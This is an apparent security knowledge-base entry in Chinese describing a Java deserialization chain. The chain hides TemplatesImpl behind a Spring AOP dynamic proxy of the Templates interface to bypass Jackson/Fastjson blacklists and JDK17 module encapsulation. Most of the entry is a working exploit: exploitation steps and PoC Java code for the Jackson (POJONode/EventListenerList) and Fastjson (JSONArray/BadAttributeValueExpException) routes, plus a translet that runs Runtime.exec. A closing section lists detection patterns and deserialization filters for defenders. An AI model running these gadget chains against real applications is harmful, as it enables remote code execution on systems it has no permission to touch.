---
id: web-java-deserialization-interface-proxy-templatesimpl-blacklist-bypass
title: 接口动态代理包装 TemplatesImpl 绕过 Jackson/Fastjson 黑名单与 JDK17 模块封装
type: scenario
domain: web
path: web/java/deserialization
technique: interface-proxy-templatesimpl-blacklist-bypass
tags:
- java
- deserialization
- jackson
- fastjson
- templatesimpl
- dynamic-proxy
- blacklist-bypass
- jdk17
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:58:53+08:00'
  notes: 已对照原文与2张图核对：核心为用 Spring JdkDynamicAopProxy 代理 javax.xml.transform.Templates 接口，序列化代理(com.sun.proxy/jdk.proxy 类名)绕过 Fastjson 2.0.27 对 TemplatesImpl/AbstractTranslet 的类名黑名单与 JDK17 java.xml 非导出封装；Jackson 走 POJONode+EventListenerList(图01 弹计算器、BeanPropertyWriter 调用栈)，Fastjson 走 JSONArray+BadAttributeValueExpException。图02 java-chains TemplatesImpl2 说明与卡片一致。未验证点/表述提醒：免继承 AbstractTranslet 变体(_bytecodes 两个+_transletIndex=0)实际是在 newInstance 构造阶段执行代码，随后 getTransletInstance 仍抛 ClassCastException，所谓'去掉父类要求'仅指绕过 defineTransletClasses 主类检查；未在本机复现；无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deserialization-interface-proxy-templatesimpl-blacklist-bypass/
draft: false
kb_aliases:
- Templates 接口代理绕过
- TemplatesImpl 黑名单绕过
- JDK17 TemplatesImpl 模块封装绕过
- JdkDynamicAopProxy Templates
- POJONode 代理链
- Fastjson TemplatesImpl 代理
---

## 一句话结论

`TemplatesImpl` 常被 Jackson/Fastjson 黑名单拦截、在 JDK17+ 又因位于 `java.xml` 非导出包而无法直接引用；但它实现了公开导出的 `javax.xml.transform.Templates` 接口。用动态代理实现 `Templates`、在 InvocationHandler 中转发到 `TemplatesImpl`，序列化代理而不是 `TemplatesImpl`，即可同时绕过类名黑名单与模块封装；Jackson（`POJONode` + `EventListenerList`）或 Fastjson（`JSONArray` + `BadAttributeValueExpException`）触发 `getOutputProperties()` 时，代理会把调用转发给真实 `TemplatesImpl` 并执行 translet 字节码。

## 原理

- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 实现了 `javax.xml.transform.Templates`，其 `getOutputProperties()`/`newTransformer()` 会 `defineTransletClasses()` 加载 `_bytecodes` 中的类并实例化，是经典 RCE sink。
- 两种拦截同时存在：
  - 类名黑名单：Fastjson 2.0.27 起把 `TemplatesImpl`、`AbstractTranslet`、`TransformerFactoryImpl` 等列入 ignore 名单（后续改为哈希）；Jackson 的 `POJONode` 链也常被安全组件按类名拦截。
  - 模块封装：JDK17+ 的 `com.sun.org.apache.xalan.internal.xsltc.trax` 位于 `java.xml` 模块的非导出包，攻击载荷不能直接引用/反射写该类；但 `javax.xml.transform.Templates` 是导出接口。
- 动态代理的类名是 `com.sun.proxy.$Proxy*`/`jdk.proxy*`，黑名单不命中；代理对象只暴露接口方法。InvocationHandler 由 Spring AOP `JdkDynamicAopProxy` 实现：`AdvisedSupport.setTarget(templatesImpl)` 后，调用代理的 `getOutputProperties()` 会经 `JdkDynamicAopProxy.invoke()` 反射调用 target 同名方法，即 `TemplatesImpl.getOutputProperties()`。
- 触发路径：
  - Jackson/JDK17：`POJONode(proxy)` 放进 `EventListenerList`+`UndoManager.edits`；反序列化时 `EventListenerList.readObject → add → UndoManager.toString → Vector.toString → String.valueOf(pojoNode.toString())`，`POJONode` 序列化代理对象时调用其 getter `getOutputProperties()`。
  - Fastjson/JDK8：`JSONArray` 中加入 proxy，放进 `BadAttributeValueExpException.val`；反序列化时 `val.toString()` → `JSONArray.toString()` → Fastjson 序列化 proxy 时调用 getter → 代理转发到 `TemplatesImpl`。
- 选择 `EventListenerList` 而非 `BadAttributeValueExpException` 的原因：JDK15 起 `BadAttributeValueExpException.val` 被限定为 `String`，高版本只能用 EventListenerList；JDK8 两者均可。
- Jackson 原生序列化时 `BaseJsonNode.writeReplace` 会把节点替换为字符串，需先用 Javassist 删除该方法，才能把 `POJONode` 原样写入序列化流。
- `TemplatesImpl` 字节码可进一步去掉 `AbstractTranslet` 父类要求：`_bytecodes` 放两个类（classCount>1）且 `_transletIndex=0` 即可（java-chains 的 TemplatesImpl2，JDK<16）。

## 触发条件

- 存在可控的 Java 原生反序列化入口；
- classpath 含 Spring AOP（`JdkDynamicAopProxy`）或攻击者可自建等价 InvocationHandler/代理；
- 环境含 Jackson（`POJONode`、`EventListenerList` 触发）或 Fastjson（`JSONArray`、`BadAttributeValueExpException`）；
- `TemplatesImpl` 可用（JDK8 或未移除 Xalan 的发行版）；JDK17+ 需通过代理接口规避模块导出；
- 未对 `java.lang.reflect.Proxy`/`com.sun.proxy`/Spring AOP 类做反序列化白名单。

## 利用步骤

1. 生成 translet 字节码（继承 `AbstractTranslet`，或使用两段字节码 + `_transletIndex=0` 的免父类形态）。
2. 反射构造 `TemplatesImpl`，设置 `_bytecodes`、`_name`、`_tfactory`。
3. 用 Spring AOP 创建代理：`AdvisedSupport` 设 target 为 `TemplatesImpl`，`JdkDynamicAopProxy` 作为 InvocationHandler，代理接口 `javax.xml.transform.Templates`。
4. Jackson 路线：删除 `BaseJsonNode.writeReplace`，`POJONode(proxy)` 放入 `UndoManager.edits`，再放入 `EventListenerList.listenerList`；序列化并发送。
5. Fastjson 路线：`JSONArray` 加入 proxy，放入 `BadAttributeValueExpException.val`，配合 `ArrayList` 序列化并发送。
6. 反序列化时代理的 `getOutputProperties()` 被调用，转发至 `TemplatesImpl`，执行字节码。

## PoC

创建代理（Spring AOP）：

```java
public static Object getBProxy(Object obj, Class[] ifaces) throws Exception {
    AdvisedSupport advisedSupport = new AdvisedSupport();
    advisedSupport.setTarget(obj);
    Constructor<?> c = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
        .getConstructor(AdvisedSupport.class);
    c.setAccessible(true);
    InvocationHandler handler = (InvocationHandler) c.newInstance(advisedSupport);
    return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), ifaces, handler);
}

Object templates = TemplatesImplUtil.getTemplatesImpl();   // 设置 _bytecodes/_name/_tfactory
Proxy proxy = (Proxy) getBProxy(templates, new Class[]{javax.xml.transform.Templates.class});
```

Jackson/JDK17 路线：

```java
// 删除 BaseJsonNode.writeReplace，否则 POJONode 原生序列化会被替换
CtClass ct = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
ct.toClass();

POJONode node = new POJONode(proxy);
EventListenerList exp = new EventListenerList();
UndoManager manager = new UndoManager();
((Vector) getFieldValue(manager, "edits")).add(node);
setFieldValue(exp, "listenerList", new Object[]{ InternalError.class, manager });
// 序列化 exp 并发送
```

Fastjson/JDK8 路线：

```java
JSONArray jsonArray = new JSONArray();
jsonArray.add(proxy);

BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
ReflectUtil.setFieldValue(bad, "val", jsonArray);

ArrayList list = new ArrayList();
list.add(proxy);
list.add(bad);
// 序列化 list 并发送
```

免 `AbstractTranslet` 的 TemplatesImpl：

```java
CtClass evil = pool.makeClass("a");
CtConstructor ctor = new CtConstructor(new CtClass[]{}, evil);
ctor.setBody("Runtime.getRuntime().exec(\"calc\");");
evil.addConstructor(ctor);
byte[][] bytes = new byte[][]{ evil.toBytecode(), pool.makeClass("b").toBytecode() };
setValue(templates, "_bytecodes", bytes);
setValue(templates, "_transletIndex", 0);   // 必须 >=0，且 classCount > 1
```

## 变体与关联

- 代理接口不限于 `Templates`：任何危险类实现的公开接口（如 `Map`、`RowSetInternal`）都可用来隐藏真实类名；`OracleCachedRowSet + POJONode` 也是同一思路。
- Handler 不限于 Spring AOP：自定义 `InvocationHandler` 反射调用 target 即可；Spring AOP 的 `JdkDynamicAopProxy` 稳定性更高、可直接复用现有类。
- Jackson 触发变体：`POJONode` + `EventListenerList`；Fastjson 触发变体：`JSONArray` + `BadAttributeValueExpException`；也可换 `JSONObject`。
- 关联：`web-java-deser-spring-aop-jdk17-templatesimpl-chain`（Spring AOP + AspectJAroundAdvice 的另一条 JDK17 反射链）、`web-java-deserialization-jdk-eventlistenerlist-tostring`（EventListenerList 触发）、`web-java-deserialization-external-xalan-templatesimpl-sink`（外部 Xalan 替代）。
- 边界：JDK17+ 若没有 Spring AOP/可用的 InvocationHandler 类，需自备代理类；`TemplatesImpl` 被彻底移除或强封装到 `Proxy.newProxyInstance` 也无法加载时失效；Fastjson 黑名单若扩展到 Proxy/接口/Handler 类则需另寻入口。

## 检测与防御

- 反序列化白名单禁止 `java.lang.reflect.Proxy`、`com.sun.proxy.$Proxy*`、`jdk.proxy*`、`JdkDynamicAopProxy`、`AdvisedSupport`、`POJONode`、`JSONArray` 等载体；仅按类名黑名单不够。
- 开启 JEP 290 `ObjectInputFilter`，限制深度/引用数并拒绝 JDK 内部代理类；Fastjson 开启 safeMode/关闭 autoType；Jackson 关闭 default typing、`enableDefaultTyping` 与不受信多态。
- 移除/限制 Xalan `TemplatesImpl`，JDK17+ 保持模块强封装（不要 `--add-opens java.xml/...`）；升级 JDK 与应用依赖。
- 检测反序列化流中出现 `com.sun.proxy`、`Templates`、`JdkDynamicAopProxy`、`POJONode`、`EventListenerList`、`BadAttributeValueExpException` 等组合。
- 不要对不可信数据做 Java 原生反序列化；接口代理绕过说明“校验类名”不能作为安全边界。
